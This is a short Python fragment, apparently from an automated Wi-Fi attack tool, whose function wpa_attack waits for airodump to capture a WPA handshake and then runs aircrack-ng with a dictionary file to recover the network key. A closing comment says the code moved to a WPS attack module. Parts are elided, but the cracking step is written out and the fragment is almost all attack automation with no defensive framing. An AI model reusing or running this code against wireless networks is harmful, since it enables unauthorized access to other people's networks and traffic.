...
def wpa_attack(bssid, channel, iface_mon):
	...
	cmd_airodump.expect(['handshake:', pexpect.TIMEOUT, pexpect.EOF], settings.WPA_EXPECT_HANDSHAKE_TIME)
	cmd_airodump.close()

	cmd_crack = pexpect.spawn('aircrack-ng -w dic cr0z0n0_attack-01.cap')
	cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], settings.WPA_AIRCRACK_TIME)
	cmd_crack.close()
	key_found = False
...
# THIS IS MOVED TO src.attacks.WpsAttack
